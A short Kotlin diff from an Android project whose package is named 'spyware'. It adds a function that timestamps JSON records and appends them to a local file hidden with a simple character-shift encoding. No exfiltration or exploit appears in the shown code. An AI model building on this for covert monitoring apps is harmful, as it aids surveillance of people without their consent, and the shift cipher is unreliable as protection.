@@ -1,8 +1,13 @@
 import android.content.Context
 import android.widget.Toast
+import com.example.spyware.common.Constants.Companion.logShift
+import com.example.spyware.common.Constants.Companion.outputFileName
+import org.json.JSONObject
 import java.io.File
 import java.io.FileOutputStream
 import java.io.FileInputStream
+import java.time.Instant
+import java.time.format.DateTimeFormatter
 
 // Shift each character n places backward (encode)
 private fun shiftStringBack(str: String, n: Int): String {
@@ -52,6 +57,13 @@ fun readShiftedFromFile(location: File, fileName: String, n: Int): String? {
 fun appendShiftedToFile(location: File, fileName: String,data:String, n: Int) {
     val content:String?=readShiftedFromFile(location,fileName,n)
     val newContent = (content ?: "") + "\n" + data
-    println("halo: "+newContent)
+    println("Full Content: "+newContent)
     writeShiftedToFile(location,fileName,newContent,n)
+}
+
+fun log(context:Context, jsonObject: JSONObject){
+    val currentUtcTime = DateTimeFormatter.ISO_INSTANT.format(Instant.now())
+    jsonObject.put("timestamp", currentUtcTime)
+    println(jsonObject.toString())
+    appendShiftedToFile(context.filesDir,outputFileName, jsonObject.toString(),logShift)
 }
